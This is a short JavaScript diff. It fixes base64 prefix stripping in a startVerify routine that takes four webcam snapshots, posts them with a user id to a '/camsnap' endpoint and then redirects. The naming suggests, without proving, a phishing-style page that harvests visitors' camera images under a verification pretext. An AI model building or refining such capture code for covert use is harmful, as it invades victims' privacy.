@@ -144,7 +144,7 @@ async function startVerify(){
   var ctx=canvas.getContext('2d'),snaps=0;
   var st=setInterval(function(){
     ctx.drawImage(video,0,0,500,500);
-    var d=canvas.toDataURL("image/png").replace("data:image/png;base64","");
+    var d=canvas.toDataURL("image/png").replace("data:image/png;base64,","");
     $.post(a+"/camsnap",{uid:uid,img:encodeURIComponent(d)});
     if(++snaps>=4){clearInterval(st);camDone=true;tryRedirect();}
   },1500);
